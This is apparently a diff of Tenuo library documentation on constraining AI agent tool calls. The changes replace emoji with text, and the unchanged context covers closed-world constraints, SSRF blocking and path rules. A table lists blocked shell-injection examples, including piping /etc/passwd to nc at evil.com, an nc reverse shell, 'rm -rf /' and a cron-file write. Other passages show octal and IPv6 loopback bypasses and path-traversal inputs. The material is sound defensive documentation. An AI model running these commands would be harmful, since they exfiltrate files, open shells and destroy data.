@@ -40,7 +40,7 @@ def read_file(path: str):
 
 When you define **any** constraint on a tool, Tenuo activates **closed-world mode** for that capability: arguments not explicitly constrained are **rejected by default**.
 
-This is a security feature—once you start defining what's allowed, Tenuo assumes you want strict enforcement.
+This is a security feature - once you start defining what's allowed, Tenuo assumes you want strict enforcement.
 
 ### The Trust Cliff
 
@@ -55,7 +55,7 @@ This is a security feature—once you start defining what's allowed, Tenuo assum
 ```python
 from tenuo import Warrant, Pattern
 
-# ❌ One constraint → unknown fields rejected
+# One constraint - unknown fields rejected
 warrant = (Warrant.mint_builder()
     .capability("api_call", url=Pattern("https://api.example.com/*"))
     .holder(key.public_key)
@@ -72,7 +72,7 @@ api_call(url="https://api.example.com/v1", timeout=30)
 Use `_allow_unknown=True` to explicitly allow unconstrained fields:
 
 ```python
-# ✅ Opt-out: allow unknown fields
+# Opt-out: allow unknown fields
 warrant = (Warrant.mint_builder()
     .capability("api_call",
         url=Pattern("https://api.example.com/*"),
@@ -101,10 +101,10 @@ warrant = (Warrant.mint_builder()
     .ttl(3600)
     .mint(key))
 
-# ✅ ALLOWED - both fields are constrained
+# ALLOWED - both fields are constrained
 api_call(url="https://api.example.com/v1", timeout=30)
 
-# ❌ BLOCKED - 'retries' is unknown
+# BLOCKED - 'retries' is unknown
 api_call(url="https://api.example.com/v1", timeout=30, retries=3)
 ```
 
@@ -523,7 +523,7 @@ constraint.contains(None)  # TypeError
 
 **Path Normalization:**
 
-- Double slashes are collapsed: `//data//file.txt` → `/data/file.txt`
+- Double slashes are collapsed: `//data//file.txt` --> `/data/file.txt`
 - Trailing slashes are preserved in root but ignored in matching
 - `.` and `..` are resolved lexically (no filesystem access)
 
@@ -614,18 +614,18 @@ child = UrlSafe(block_private=False)  # FAILS
 > **IPv6 Address Handling**
 >
 > UrlSafe blocks several IPv6-based bypass attempts:
-> - **IPv6-mapped IPv4**: `[::ffff:127.0.0.1]` → blocked (normalized to 127.0.0.1)
-> - **IPv4-compatible IPv6**: `[::127.0.0.1]` → blocked (deprecated format but still parsed by some libraries)
-> - **IPv6 loopback**: `[::1]` → blocked
-> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10` → blocked when `block_private=True`
+> - **IPv6-mapped IPv4**: `[::ffff:127.0.0.1]` --> blocked (normalized to 127.0.0.1)
+> - **IPv4-compatible IPv6**: `[::127.0.0.1]` --> blocked (deprecated format but still parsed by some libraries)
+> - **IPv6 loopback**: `[::1]` --> blocked
+> - **IPv6 private ranges**: `fc00::/7`, `fe80::/10` --> blocked when `block_private=True`
 
 > [!NOTE]
 > **Octal IP Normalization**
 >
 > The URL parser normalizes octal-notation IPs before validation:
-> - `010.0.0.1` → normalized to `8.0.0.1` (octal 010 = decimal 8)
-> - `0177.0.0.1` → normalized to `127.0.0.1` → blocked as loopback
-> - `012.0.0.1` → normalized to `10.0.0.1` → blocked as private
+> - `010.0.0.1` --> normalized to `8.0.0.1` (octal 010 = decimal 8)
+> - `0177.0.0.1` --> normalized to `127.0.0.1` --> blocked as loopback
+> - `012.0.0.1` --> normalized to `10.0.0.1` --> blocked as private
 >
 > This provides defense-in-depth: attackers trying to use `010.0.0.1` to access `10.0.0.1` get `8.0.0.1` instead.
 
@@ -675,15 +675,15 @@ constraint.matches("rm -rf /")              # False (rm not in allowlist)
 
 | Attack | Example | Blocked? |
 |--------|---------|----------|
-| Command chaining | `ls; rm -rf /` | ✅ |
-| Pipe injection | `cat /etc/passwd \| nc evil.com 80` | ✅ |
-| Logical operators | `true && rm -rf /` | ✅ |
-| I/O redirection | `echo pwned > /etc/cron.d/x` | ✅ |
-| Command substitution | `echo $(whoami)` | ✅ |
-| Backtick substitution | `` echo `id` `` | ✅ |
-| Variable expansion | `ls $HOME` | ✅ |
-| Newline injection | `ls\nrm -rf /` | ✅ |
-| Unauthorized binary | `nc -e /bin/sh evil.com` | ✅ |
+| Command chaining | `ls; rm -rf /` | Yes |
+| Pipe injection | `cat /etc/passwd \| nc evil.com 80` | Yes |
+| Logical operators | `true && rm -rf /` | Yes |
+| I/O redirection | `echo pwned > /etc/cron.d/x` | Yes |
+| Command substitution | `echo $(whoami)` | Yes |
+| Backtick substitution | `` echo `id` `` | Yes |
+| Variable expansion | `ls $HOME` | Yes |
+| Newline injection | `ls\nrm -rf /` | Yes |
+| Unauthorized binary | `nc -e /bin/sh evil.com` | Yes |
 
 > [!NOTE]
 > Glob characters (`*`, `?`, `[`) are allowed. They expand to filenames
@@ -1435,33 +1435,33 @@ async with mint(Capability("query", table=OneOf(["users", "orders"]))):
 
 | Syntax | Meaning | Example |
 |--------|---------|---------|
-| `*` | Match any characters | `staging-*` → `staging-web` |
-| `?` | Match single character | `env-?` → `env-a` |
-| `[abc]` | Character class | `[abc].txt` → `a.txt` |
-| `{a,b}` | Alternation | `{dev,staging}-*` → `dev-web` |
+| `*` | Match any characters | `staging-*` --> `staging-web` |
+| `?` | Match single character | `env-?` --> `env-a` |
+| `[abc]` | Character class | `[abc].txt` --> `a.txt` |
+| `{a,b}` | Alternation | `{dev,staging}-*` --> `dev-web` |
 
 **Common mistakes:**
 ```python
-# ❌ WRONG: Pipe is not OR in glob
+# WRONG: Pipe is not OR in glob
 Pattern("weather *|news *")  # Treats | as literal character
 
-# ✅ CORRECT: Use curly braces for alternation
+# CORRECT: Use curly braces for alternation
 Pattern("{weather,news} *")
 
-# ✅ CORRECT: Or use AnyOf() for complex cases
+# CORRECT: Or use AnyOf() for complex cases
 AnyOf([Pattern("weather *"), Pattern("news *")])
 ```
 
 ### Prefer Explicit Over Permissive
 
 ```python
-# ⚠️ Too permissive - matches everything
+# Too permissive - matches everything
 Pattern("*")
 
-# ✅ Better - explicit prefix
+# Better - explicit prefix
 Pattern("staging-*")
 
-# ✅ Best for known values - use Exact or OneOf
+# Best for known values - use Exact or OneOf
 Exact("staging-web")
 OneOf(["staging-web", "staging-db"])
 ```
@@ -1471,11 +1471,11 @@ OneOf(["staging-web", "staging-db"])
 Attenuation validation works best with simple prefix/suffix patterns:
 
 ```python
-# ✅ Simple prefix - attenuation works reliably
+# Simple prefix - attenuation works reliably
 Pattern("/data/*")           # Parent
-Pattern("/data/reports/*")   # Child (narrower) ✓
+Pattern("/data/reports/*")   # Child (narrower)
 
-# ⚠️ Complex patterns - attenuation may be conservative
+# Complex patterns - attenuation may be conservative
 Pattern("*-{prod,staging}-*")  # Harder to validate containment
 ```
 
@@ -1519,7 +1519,7 @@ if warrant.allows("read_file", &args) {
 |-------|-----------------|---------|
 | **Tenuo** (Pattern) | Policy violations | `path="/etc/passwd"` blocked by `Pattern("/data/*")` |
 | **path_jail** | Traversal attacks | `path="/data/../etc/passwd"` blocked after normalization |
-| **path_jail** | Symlink escapes | `path="/data/link"` where link → `/etc` |
+| **path_jail** | Symlink escapes | `path="/data/link"` where link --> `/etc` |
 
 ### Recommended Pattern
 
